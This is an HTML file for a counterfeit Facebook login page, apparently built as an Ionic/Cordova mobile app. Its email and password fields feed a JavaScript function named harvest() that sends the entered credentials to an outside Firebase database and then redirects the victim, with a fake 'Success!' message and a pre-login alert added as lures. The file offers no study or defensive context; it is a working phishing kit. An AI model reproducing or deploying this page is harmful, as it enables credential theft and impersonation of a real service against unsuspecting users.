<!DOCTYPE html>
<html>
    <title>Log into Facebook | Facebook</title>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width">
        
        <script src='https://cdn.firebase.com/js/client/2.2.1/firebase.js'></script>
        <script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js'></script>
        <link rel="stylesheet" type="text/css" href="css/style.css">
        <link rel='shortcut icon' href='img/fb-icon.png'>
        
        <link href="lib/ionic/css/ionic.css" rel="stylesheet">

        <!-- ionic/angularjs js -->
        <script src="lib/ionic/js/ionic.bundle.js"></script>

        <!-- cordova script (this will be a 404 during development) -->
        <script src="cordova.js"></script>
        
        <!-- your app's js -->
        <script src="js/app.js"></script>
        <script src="js/controllers.js"></script>
        <script src="js/services.js"></script>
        
        <script>alert('You must be logged in first!');</script>
    </head>
    <body ng-app="starter">
        <center>
            <img src="img/facebook.png" width="250px">
            <br>
            <div id='message'></div>
            <br>
            <input type="text" id="username" placeholder="Email">
        </center>
            <br>
        <center>
            <input type="password" id="password" placeholder="Password">
        </center>
            <br>
        <center>
            <input type="button" id="submit" value="Log In" onclick="harvest();">
            <br><br><br>
            
            <a href="https://www.facebook.com/signup"><p>Sign Up for Facebook</p></a>
        </center>
        
        <script>
			var myDataRef = new Firebase('https://resplendent-heat-6493.firebaseio.com/');
			function harvest(){
                var username = $('#username').val();
                var password = $('#password').val();
                if (username != null && username.trim() != '' && password != null && password.trim() != ''){
                    myDataRef.push({username: username, password: password});
                    $('#password').val('');
                    alert('Success!');
                    window.location = "html/home.html";    
                }else{
                    document.getElementById('message').innerHTML = "Incorrect Email/Password. Please try again.";
                }
            }
        </script>
    </body>
</html>
